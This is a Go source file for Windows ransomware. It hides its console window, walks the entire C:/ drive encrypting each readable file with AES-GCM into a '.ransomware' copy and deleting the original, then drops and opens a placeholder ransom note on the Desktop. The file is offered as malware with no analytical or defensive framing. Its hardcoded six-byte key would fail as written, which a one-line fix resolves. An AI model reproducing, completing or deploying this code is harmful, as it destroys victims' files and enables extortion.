package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"syscall"
)

// hideConsole hides the console window
func hideConsole() {
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	user32 := syscall.NewLazyDLL("user32.dll")

	// Get the console window handle
	getConsoleWindow := kernel32.NewProc("GetConsoleWindow")
	showWindow := user32.NewProc("ShowWindow")

	handle, _, _ := getConsoleWindow.Call()

	// Hide the console window
	const SW_HIDE = 0
	showWindow.Call(handle, uintptr(SW_HIDE))
}

func createReadMeFile() {
	// Customize the content of the READ-ME.txt file here
	content := `
	Ransom Note Here
	`

	// Get user's desktop directory
	desktopPath := os.Getenv("USERPROFILE") + "\\Desktop"
	readMePath := filepath.Join(desktopPath, "README.txt")

	// Write the content to the file
	err := os.WriteFile(readMePath, []byte(content), 0666)
	if err != nil {
		fmt.Println("Error creating README.txt:", err)
	} else {
		fmt.Println("READ-ME.txt created on Desktop.")

		// Open the file with Notepad
		err = exec.Command("notepad.exe", readMePath).Start()
		if err != nil {
			fmt.Println("Error opening README.txt:", err)
		}
	}
}

func main() {
	// Hide console window
	hideConsole()

	// Initialize AES in GCM mode
	key := []byte("Key123") // Ensure key is 32 bytes for AES-256
	block, err := aes.NewCipher(key)
	if err != nil {
		panic("error while setting up aes")
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		panic("error while setting up gcm")
	}

	err = filepath.Walk("C:/", func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}
		// skip if directory
		if !info.IsDir() {
			// encrypt the file
			fmt.Println("Encrypting " + path + "...")

			// read file contents
			original, err := os.ReadFile(path)
			if err == nil {
				// encrypt bytes
				nonce := make([]byte, gcm.NonceSize())
				io.ReadFull(rand.Reader, nonce)
				encrypted := gcm.Seal(nonce, nonce, original, nil)

				// write encrypted contents
				err = os.WriteFile(path+".ransomware", encrypted, 0666)
				if err == nil {
					os.Remove(path) // delete the original file
				} else {
					fmt.Println("error while writing contents")
				}
			} else {
				fmt.Println("error while reading file contents")
			}
		}
		return nil
	})

	// Create READ-ME.txt on Desktop
	createReadMeFile()

	if err != nil {
		fmt.Println("Error during file walk:", err)
	}
}
